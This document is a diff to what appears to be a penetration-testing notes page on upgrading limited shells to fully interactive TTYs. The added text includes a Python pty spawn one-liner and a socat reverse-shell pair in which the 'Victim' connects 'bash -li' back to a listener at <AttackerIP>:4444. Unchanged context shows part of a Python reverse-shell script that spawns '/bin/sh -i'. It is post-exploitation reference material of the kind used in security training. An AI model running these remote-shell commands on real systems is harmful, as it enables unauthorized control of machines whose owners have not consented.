@@ -108,9 +108,35 @@ once exit vi \(:q!\) we would get a shell. Helpful in scenarios where the user i
 
 ## Interactive tty-shell
 
+### **Method \#1**
+
+# Python pty module {#method1pythonptymodule}
+
+```
+python -c 'import pty; pty.spawn("/bin/bash")' 
+```
+
+
+
+### Method \#2
+
+# Using socat {#method2usingsocat}
+
 So if you manage to upgrade to a non-interactive tty-shell you will still have a limited shell. You won't be able to use the up and down arrows, you won't have tab-completion. This might be really frustrating if you stay in that shell for long. It can also be more risky, if a execution gets stuck you cant use Ctr-C or Ctr-Z without killing your session. However that can be fixed using socat. Follow these instructions.
 
+**On Kali \(listen\):**
+
+    socat file:`tty`,raw,echo=0 tcp-listen:4444  
+
+**On Victim \(launch\):**
+
+```
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<AttackerIP>:4444
+```
+
 [https://github.com/cornerpirate/socat-shell](https://github.com/cornerpirate/socat-shell)
+
+### Method \#3
 
 **Using stty**
 
@@ -130,7 +156,7 @@ $ export TERM=xterm-256color
 $ stty rows <num> columns <cols>
 ```
 
-## Simple Reverse Shell
+## Misc: Simple Reverse Shell
 
 ```
 echo "import socket" > script.py
@@ -150,5 +176,5 @@ echo 'p=subprocess.call(["/bin/sh","-i"])' >> script.py
 [http://netsec.ws/?p=337](http://netsec.ws/?p=337)  
 [http://pentestmonkey.net/blog/post-exploitation-without-a-tty](http://pentestmonkey.net/blog/post-exploitation-without-a-tty)
 
-https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+[https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
 
